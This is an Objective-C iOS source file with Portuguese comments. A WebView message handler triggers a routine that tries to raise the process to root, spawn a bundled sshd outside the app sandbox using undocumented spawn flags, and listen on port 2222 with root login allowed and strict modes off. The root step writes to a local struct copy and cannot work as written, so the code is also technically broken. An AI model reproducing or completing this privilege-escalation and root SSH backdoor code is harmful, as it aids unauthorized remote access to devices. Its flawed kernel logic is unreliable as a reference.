#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <stdint.h>
#include <mach/mach.h>
#include <sys/sysctl.h>
#include <unistd.h>
#include <spawn.h>
#include <sys/stat.h>
#include <sys/wait.h>

// --- INTERFACE (Necessária para o compilador conhecer as propriedades) ---
@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView; 
@end

// --- IMPLEMENTAÇÃO ---
@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self runSSHDExploit];
    }
}

- (void)runSSHDExploit {
    // 1. Log inicial via WebView
    [self.webView evaluateJavaScript:@"log('⚡ Tentando elevar UID...')" completionHandler:nil];

    // 2. KERNEL PATCH (UID 0)
    // Nota: Em iOS oficial, o vm_copy falhará sem um exploit de kernel prévio.
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    sysctl(mib, 4, &kp, &len, NULL, 0);
    uint32_t *uid_ptr = &kp.kp_eproc.e_ucred.cr_uid;
    uint32_t root_val = 0;
    
    // Esta chamada exige privilégios de kernel
    kern_return_t kr = vm_copy(mach_task_self(), (vm_address_t)&root_val, 4, (vm_address_t)uid_ptr);
    if (kr != KERN_SUCCESS) {
        [self.webView evaluateJavaScript:@"log('❌ vm_copy falhou (Sem Exploit/Root)')" completionHandler:nil];
    }

    // 3. PREPARAR BINÁRIO SSHD
    NSFileManager *fm = [NSFileManager defaultManager];
    NSString *bundleSshd = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    NSString *execPath = @"/var/tmp/sshd";

    if (!bundleSshd) {
        [self.webView evaluateJavaScript:@"log('❌ Erro: sshd ausente no Bundle')" completionHandler:nil];
        return;
    }

    [fm removeItemAtPath:execPath error:nil];
    if ([fm copyItemAtPath:bundleSshd toPath:execPath error:nil]) {
        chmod([execPath UTF8String], 0755);
    }

    // 4. SPAWN ATTRS (Bypass Sandbox)
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    // Flags para tentar forçar execução fora do container
    short flags = POSIX_SPAWN_SETPGROUP | 0x1000 | 0x4000; 
    posix_spawnattr_setflags(&attr, flags);

    // 5. ARGUMENTOS SSHD
    char *const sshd_argv[] = {
        (char *)[execPath UTF8String],
        "-p", "2222",
        "-D",
        "-o", "PermitRootLogin=yes",
        "-o", "StrictModes=no",
        NULL
    };

    // 6. EXECUÇÃO
    pid_t pid;
    int spawn_err = posix_spawn(&pid, [execPath UTF8String], NULL, &attr, sshd_argv, NULL);

    if (spawn_err == 0) {
        NSString *ok = [NSString stringWithFormat:@"log('✅ SSH ONLINE! PID: %d')", pid];
        [self.webView evaluateJavaScript:ok completionHandler:nil];
    } else {
        NSString *err = [NSString stringWithFormat:@"log('❌ Spawn Erro: %d (Sandbox Bloqueou)')", spawn_err];
        [self.webView evaluateJavaScript:err completionHandler:nil];
    }

    posix_spawnattr_destroy(&attr);
}

@end
